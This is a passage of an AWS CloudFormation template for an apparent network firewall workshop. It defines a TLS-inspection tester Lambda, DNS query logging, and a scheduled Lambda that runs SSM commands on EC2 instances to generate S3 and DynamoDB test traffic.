                  dev_status, dev_stdout, dev_stderr = tls_results[test['Name']]['DEV']
                  prod_status, prod_stdout, prod_stderr = tls_results[test['Name']]['PROD']
                  
                  dev_result = parse_tls_result(dev_status, dev_stdout, dev_stderr)
                  prod_result = parse_tls_result(prod_status, prod_stdout, prod_stderr)
                  
                  # No inversion needed - print_test_result handles the display logic
                  # parse_tls_result returns: 0 = allowed, 1 = blocked
                  # print_test_result displays: 1 = blocked (green/success), 0 = allowed (red/fail)
                  
                  log_message(f"Test completed: {test['Name']}")
                  output_line = print_test_result(test, dev_result, prod_result)
                  print(output_line)

              output = buffer.getvalue()
              sys.stdout = sys.__stdout__

              css_styles = """
              <style>
                  .success { color: green; }
                  .fail { color: red; }
                  .warning { color: orange; }
                  .normal { color: black; }
                  hr { border: 1px solid black; }
                  pre { white-space: pre-wrap; word-wrap: break-word; }
                  h3 { margin-top: 20px; margin-bottom: 10px; }
                  ul { margin-left: 20px; }
                  li { margin-bottom: 10px; }
              </style>
              """

              body = css_styles + '<pre>' + output + '</pre>'
              
              return {
                  'statusCode': 200,
                  'body': body,
                  'headers': {
                      'Content-Type': 'text/html'
                  }
              }
      FunctionName: TLS-Inspection-Tests
      Handler: index.handler
      Role: !GetAtt LambdaExecutionRole.Arn
      Runtime: python3.12
      MemorySize: 4096
      Timeout: 60
      LoggingConfig:
        LogGroup: !Ref TLSInspectionTesterScriptLogGroup
      Environment:
        Variables:
          DEV_INSTANCE_ID: !GetAtt DevVPC1WorkloadInstance1.InstanceId
          PROD_INSTANCE_ID: !GetAtt ProdVPC1WorkloadInstance1.InstanceId
          PUBLIC_INTERNET_HOST_IP: !GetAtt PublicInternetHost.PublicIp

  # Lambda function URL for TLS inspection tester function
  TLSInspectionTesterScriptFunctionURL:
    Type: AWS::Lambda::Url
    Properties:
      AuthType: AWS_IAM
      TargetFunctionArn: !GetAtt TLSInspectionTesterScript.Arn

  # Allow TLS Inspection Tester Lambda to be invoked from CloudFront via OAC
  TLSInspectionTesterScriptPermissionPolicy:
    Metadata:
      cfn_nag:
        rules_to_suppress:
          - id: W24
            reason: "Policy is required"
    Type: AWS::Lambda::Permission
    Properties:
      Action: lambda:InvokeFunctionUrl
      FunctionName: !Ref TLSInspectionTesterScript
      Principal: cloudfront.amazonaws.com
      SourceArn: !Sub arn:${AWS::Partition}:cloudfront::${AWS::AccountId}:distribution/${TestScriptDistribution}


  # DNS Query Logging Configuration
  Route53ResolverProdQueryConfig:
    Type: AWS::Route53Resolver::ResolverQueryLoggingConfig
    Properties: 
      DestinationArn: !GetAtt EgressProdDNSQueryLogs.Arn
      Name: prod-egress-query-logging

  EgressProdDNSQueryLogs:
    Metadata:
      checkov:
        skip:
          - id: "CKV_AWS_158"
            comment: "Ensure that CloudWatch Log Group is encrypted by KMS"
      cfn_nag:
        rules_to_suppress:
          - id: W84
            reason: "CloudWatch Log Group does not require KMS encryption" 
    Type: AWS::Logs::LogGroup
    Properties:
      LogGroupName: prod-egress-query-logging
      RetentionInDays: 7


  # DNS Query Logging Configuration
  Route53ResolverDevQueryConfig:
    Type: AWS::Route53Resolver::ResolverQueryLoggingConfig
    Properties: 
      DestinationArn: !GetAtt EgressDevDNSQueryLogs.Arn
      Name: dev-egress-query-logging

  EgressDevDNSQueryLogs:
    Metadata:
      checkov:
        skip:
          - id: "CKV_AWS_158"
            comment: "Ensure that CloudWatch Log Group is encrypted by KMS"
      cfn_nag:
        rules_to_suppress:
          - id: W84
            reason: "CloudWatch Log Group does not require KMS encryption" 
    Type: AWS::Logs::LogGroup
    Properties:
      LogGroupName: dev-egress-query-logging
      RetentionInDays: 7


  Route53ResolverQueryConfigAssociationProd:
    Type: AWS::Route53Resolver::ResolverQueryLoggingConfigAssociation
    Properties:
      ResolverQueryLogConfigId: !GetAtt Route53ResolverProdQueryConfig.Id
      ResourceId: !Ref ProdVPC


  Route53ResolverQueryConfigAssociationDev:
    Type: AWS::Route53Resolver::ResolverQueryLoggingConfigAssociation
    Properties:
      ResolverQueryLogConfigId: !GetAtt Route53ResolverDevQueryConfig.Id
      ResourceId: !Ref DevVPC




  # S3 Bucket for PrivateLink candidate traffic generation
  PrivateLinkCandidateS3Bucket:
    Metadata:
      checkov:
        skip:
          - id: "CKV_AWS_18"
            comment: "Workshop S3 bucket - access logging not required"
          - id: "CKV_AWS_21"
            comment: "Workshop S3 bucket - versioning not required"
      cfn_nag:
        rules_to_suppress:
          - id: W35
            reason: "Workshop S3 bucket - access logging not required"
    Type: AWS::S3::Bucket
    Properties:
      BucketEncryption:
        ServerSideEncryptionConfiguration:
          - ServerSideEncryptionByDefault:
              SSEAlgorithm: AES256
      PublicAccessBlockConfiguration:
        BlockPublicAcls: true
        BlockPublicPolicy: true
        IgnorePublicAcls: true
        RestrictPublicBuckets: true
      Tags:
        - Key: Name
          Value: !Sub "privatelink-candidate-${AWS::StackName}"

  # DynamoDB Table for PrivateLink candidate traffic generation
  PrivateLinkCandidateDynamoDBTable:
    Metadata:
      checkov:
        skip:
          - id: "CKV_AWS_119"
            comment: "Workshop DynamoDB table - customer managed KMS not required"
          - id: "CKV_AWS_28"
            comment: "Workshop DynamoDB table - point-in-time recovery not required"
    Type: AWS::DynamoDB::Table
    Properties:
      TableName: !Sub "privatelink-candidate-${AWS::StackName}"
      BillingMode: PAY_PER_REQUEST
      AttributeDefinitions:
        - AttributeName: id
          AttributeType: S
      KeySchema:
        - AttributeName: id
          KeyType: HASH
      Tags:
        - Key: Name
          Value: !Sub "privatelink-candidate-${AWS::StackName}"

  # IAM Role for PrivateLink Traffic Generator Lambda
  PrivateLinkTrafficGenLambdaRole:
    Metadata:
      checkov:
        skip:
          - id: "CKV_AWS_111"
            comment: "Workshop requires SSM access to execute commands on EC2 instances"
    Type: AWS::IAM::Role
    Properties:
      AssumeRolePolicyDocument:
        Version: '2012-10-17'
        Statement:
          - Effect: Allow
            Principal:
              Service: lambda.amazonaws.com
            Action: sts:AssumeRole
      ManagedPolicyArns:
        - arn:aws:iam::aws:policy/service-role/AWSLambdaBasicExecutionRole
      Policies:
        - PolicyName: SSMCommandExecution
          PolicyDocument:
            Version: '2012-10-17'
            Statement:
              - Effect: Allow
                Action:
                  - ssm:SendCommand
                  - ssm:GetCommandInvocation
                Resource: '*'

  # Lambda Function for PrivateLink Traffic Generation
  PrivateLinkTrafficGenLambda:
    Metadata:
      checkov:
        skip:
          - id: "CKV_AWS_115"
            comment: "Workshop Lambda - concurrency limits not required"
          - id: "CKV_AWS_116"
            comment: "Workshop Lambda - DLQ not required"
          - id: "CKV_AWS_117"
            comment: "Workshop Lambda - VPC configuration not required"
          - id: "CKV_AWS_173"
            comment: "Workshop Lambda - environment variables not sensitive"
      cfn_nag:
        rules_to_suppress:
          - id: W89
            reason: "Workshop Lambda - VPC configuration not required"
          - id: W92
            reason: "Lambda function does not need ReservedConcurrentExecutions"
    Type: AWS::Lambda::Function
    Properties:
      FunctionName: !Sub "${AWS::StackName}-privatelink-traffic-gen"
      Runtime: python3.12
      Handler: index.handler
      Role: !GetAtt PrivateLinkTrafficGenLambdaRole.Arn
      Timeout: 300
      Environment:
        Variables:
          PROD_INSTANCE_1_ID: !Ref ProdVPC1WorkloadInstance1
          PROD_INSTANCE_2_ID: !Ref ProdVPC1WorkloadInstance2
          PROD_INSTANCE_3_ID: !Ref ProdVPC1WorkloadInstance3
          DEV_INSTANCE_ID: !Ref DevVPC1WorkloadInstance1
          BUCKET_NAME: !Ref PrivateLinkCandidateS3Bucket
          TABLE_NAME: !Ref PrivateLinkCandidateDynamoDBTable
      Code:
        ZipFile: |
          from os import environ
          import boto3
          import time
          from datetime import datetime

          def execute_ssm_command(ssm_client, instance_id, command):
              """Execute a command on an EC2 instance via SSM"""
              try:
                  response = ssm_client.send_command(
                      InstanceIds=[instance_id],
                      DocumentName='AWS-RunShellScript',
                      Parameters={'commands': [command]}
                  )
                  command_id = response['Command']['CommandId']

                  max_attempts = 10
                  attempt = 0
                  while attempt < max_attempts:
                      try:
                          output = ssm_client.get_command_invocation(
                              CommandId=command_id,
                              InstanceId=instance_id
                          )
                          
                          if output['Status'] in ['Success', 'Failed', 'Cancelled']:
                              return output['Status'], output.get('StandardOutputContent', ''), output.get('StandardErrorContent', '')
                          
                          time.sleep(1)
                          attempt += 1
                      except ssm_client.exceptions.InvocationDoesNotExist:
                          time.sleep(1)
                          attempt += 1
                          continue

                  return 'Timeout', '', 'Command execution timed out'
              except Exception as e:
                  return 'Failed', '', str(e)

          def generate_traffic_on_instance(ssm_client, instance_id, bucket_name, table_name):
              """Generate PrivateLink candidate traffic from an EC2 instance"""
              
              # S3 operations
              s3_commands = f"""
          TIMESTAMP=$(date +%s)
          INSTANCE_ID=$(ec2-metadata --instance-id | cut -d " " -f 2)
          echo "Testing S3 access at $TIMESTAMP from $INSTANCE_ID" > /tmp/s3-test-$TIMESTAMP.txt
          aws s3 cp /tmp/s3-test-$TIMESTAMP.txt s3://{bucket_name}/test-$INSTANCE_ID-$TIMESTAMP.txt
          aws s3 ls s3://{bucket_name}/
          rm -f /tmp/s3-test-$TIMESTAMP.txt
          """
              
              # DynamoDB operations
              dynamodb_commands = f"""
          TIMESTAMP=$(date +%s)
          INSTANCE_ID=$(ec2-metadata --instance-id | cut -d " " -f 2)
          aws dynamodb put-item \
            --table-name {table_name} \
            --item '{{"id": {{"S": "'$INSTANCE_ID-$TIMESTAMP'"}}, "timestamp": {{"N": "'$TIMESTAMP'"}}, "instance": {{"S": "'$INSTANCE_ID'"}}}}'
          aws dynamodb scan --table-name {table_name} --limit 5
          """
              
              # Execute S3 commands
              print(f"Executing S3 operations on {instance_id}")
              s3_status, s3_stdout, s3_stderr = execute_ssm_command(ssm_client, instance_id, s3_commands)
              print(f"S3 operations status: {s3_status}")
              
              # Execute DynamoDB commands
              print(f"Executing DynamoDB operations on {instance_id}")
              dynamodb_status, dynamodb_stdout, dynamodb_stderr = execute_ssm_command(ssm_client, instance_id, dynamodb_commands)
              print(f"DynamoDB operations status: {dynamodb_status}")
              
              return {
                  's3_status': s3_status,
                  'dynamodb_status': dynamodb_status
              }

          def handler(event, context):
              """Lambda handler to generate PrivateLink candidate traffic"""
              
              ssm_client = boto3.client('ssm')
              
              # Get environment variables
              prod_instance_1 = environ['PROD_INSTANCE_1_ID']
              prod_instance_2 = environ['PROD_INSTANCE_2_ID']
              prod_instance_3 = environ['PROD_INSTANCE_3_ID']
              dev_instance = environ['DEV_INSTANCE_ID']
              bucket_name = environ['BUCKET_NAME']
              table_name = environ['TABLE_NAME']
              
              results = {}
              
              # Generate traffic from all instances
              for instance_id, instance_name in [
                  (prod_instance_1, 'PROD-Instance-1'),
                  (prod_instance_2, 'PROD-Instance-2'),
                  (prod_instance_3, 'PROD-Instance-3'),
                  (dev_instance, 'DEV-Instance')
              ]:
                  print(f"Generating traffic from {instance_name} ({instance_id})")
                  results[instance_name] = generate_traffic_on_instance(
                      ssm_client, 
                      instance_id, 
                      bucket_name, 
                      table_name
                  )
              
              print(f"Traffic generation complete: {results}")
              
              return {
                  'statusCode': 200,
                  'body': results
              }

  # EventBridge Rule to trigger Lambda every 5 minutes
  PrivateLinkTrafficGenSchedule:
    Type: AWS::Events::Rule
    Properties:
      Name: !Sub "${AWS::StackName}-privatelink-traffic-gen-schedule"
      Description: "Trigger PrivateLink traffic generation every 5 minutes"
      ScheduleExpression: "rate(5 minutes)"
      State: ENABLED
      Targets:
        - Arn: !GetAtt PrivateLinkTrafficGenLambda.Arn
          Id: PrivateLinkTrafficGenLambdaTarget

  # Permission for EventBridge to invoke Lambda
  PrivateLinkTrafficGenLambdaInvokePermission:
    Type: AWS::Lambda::Permission
    Properties:
      FunctionName: !Ref PrivateLinkTrafficGenLambda
      Action: lambda:InvokeFunction
      Principal: events.amazonaws.com
      SourceArn: !GetAtt PrivateLinkTrafficGenSchedule.Arn

  # CloudWatch Log Group for Network Firewall TLS Inspection Logs
  NetworkFirewallTLSLogGroup:
    Metadata:
      checkov:
        skip:
          - id: "CKV_AWS_158"
            comment: "Workshop CloudWatch Logs - KMS encryption not required"
    Type: AWS::Logs::LogGroup
    Properties:
      LogGroupName: "/network-firewall/tls-logs"
      RetentionInDays: 7
      Tags:
        - Key: Name
          Value: "/network-firewall/tls-logs"

Outputs:
  DevToProdTesterURL:
    Description: DEV to PROD tester script
    Value: !Sub https://${TestScriptDistribution.DomainName}/dev-to-prod
    Export:
      Name: DevToProdTesterURL

  EgressTesterURL:
    Description: Egress tester script
    Value: !Sub https://${TestScriptDistribution.DomainName}/egress
    Export:
      Name: EgressTesterURL

  AllowListTesterURL:
    Description: Domain Allow List tester script
    Value: !Sub https://${TestScriptDistribution.DomainName}/allowlist
    Export:
      Name: AllowListTesterURL

  TLSInspectionTesterURL:
    Description: TLS Inspection tester script
    Value: !Sub https://${TestScriptDistribution.DomainName}/tls-inspection
    Export:
      Name: TLSInspectionTesterURL